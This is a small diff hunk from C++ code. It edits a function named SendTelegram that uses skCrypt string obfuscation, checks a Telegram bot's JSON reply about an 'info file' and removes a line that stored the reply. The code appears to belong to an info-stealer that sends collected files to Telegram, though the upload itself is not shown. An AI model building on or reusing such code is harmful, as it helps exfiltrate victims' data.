@@ -73,7 +73,6 @@ void SendTelegram() {
         char str[sizeof(buf) + 1];
         memcpy(str, buf, sizeof(buf));
         str[sizeof(buf)] = 0;
-        filesLink.push_back(str);
         Json data = Json::parse(str);
         if (!data[(string)skCrypt("ok")])
             cout << (string)skCrypt("Info file not sent via telegram bot") << endl;
